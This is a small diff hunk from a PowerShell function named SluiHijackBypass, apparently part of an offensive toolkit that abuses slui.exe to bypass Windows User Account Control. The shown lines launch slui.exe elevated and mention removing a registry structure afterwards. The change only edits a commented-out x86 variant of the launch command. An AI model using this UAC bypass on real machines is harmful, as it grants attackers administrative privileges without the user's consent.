@@ -31,7 +31,7 @@ function SluiHijackBypass(){
 		Start-Process "C:\Windows\System32\slui.exe" -Verb runas
 
 		#In Windows x86
-		#C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\slui.exe -Verb runas
+		#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
 
 	#Remove registry structure
 	Start-Sleep 3
